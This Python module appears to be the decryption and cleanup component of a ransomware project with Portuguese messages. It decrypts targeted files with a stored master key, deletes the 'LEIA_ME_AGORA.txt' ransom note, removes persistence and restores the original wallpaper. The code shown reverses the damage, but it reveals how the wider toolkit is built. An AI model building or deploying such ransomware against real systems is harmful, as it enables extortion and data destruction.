import os
import ctypes
import target_discovery
import crypto_engine
import persistence
import metrics

WALLPAPER_BACKUP_FILE = "wallpaper_original.path"
BACKUP_FULL_PATH = os.path.join(os.environ['TEMP'], WALLPAPER_BACKUP_FILE)

def restore_original_wallpaper():
    if not os.path.exists(BACKUP_FULL_PATH):
        return

    try:
        with open(BACKUP_FULL_PATH, "r") as f:
            original_path = f.read().strip()

        if os.path.exists(original_path):
             ctypes.windll.user32.SystemParametersInfoW(20, 0, original_path, 3)

        os.remove(BACKUP_FULL_PATH)
    except Exception:
        pass

def run_decryption_logic():
    log = []
    if not os.path.exists(crypto_engine.KEY_FILE): return "ERRO CRÍTICO: Chave mestra não encontrada."
    with open(crypto_engine.KEY_FILE, "rb") as kf: key = kf.read()
    targets = target_discovery.discover_files()
    decrypted_count = 0
    for file_path in targets:
        if "LEIA_ME_AGORA.txt" in file_path: continue
        if crypto_engine.decrypt_file(file_path, key): decrypted_count += 1

    r_note = os.path.join(target_discovery.SAFE_DIR, "LEIA_ME_AGORA.txt")
    if os.path.exists(r_note):
        try: os.remove(r_note)
        except: pass

    persistence.remove_persistence()
    restore_original_wallpaper()

    stats = metrics.verify_integrity_gui(targets)
    log.append(f"Arquivos Recuperados: {decrypted_count}")
    log.append(f"Integridade: {stats['success_rate']:.2f}%")
    return "\n".join(log)